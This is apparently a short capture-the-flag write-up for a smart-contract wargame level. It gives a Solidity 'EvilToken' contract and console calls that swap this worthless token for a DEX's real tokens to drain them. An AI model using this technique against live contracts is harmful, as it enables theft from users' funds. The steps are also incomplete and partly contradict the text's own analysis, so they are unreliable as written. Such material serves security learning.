### Analysis
Since the from and to arguments can now be any arbitrary address, we can write our own token contract with a bugged balanceOf function and pass our contract into from.

### The Exploit
deploy a token - EvilToken,with initial supply of 400, all given to msg.sender which would be the player:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
        _mint(msg.sender, initialSupply);
    }
}
~~~
interact with the target contract:
~~~
t1 = await contract.token1()
t2 = await contract.token2()
await contract.swap(evlToken, t1, 100)
await contract.swap(evlToken, t2, 200)
~~~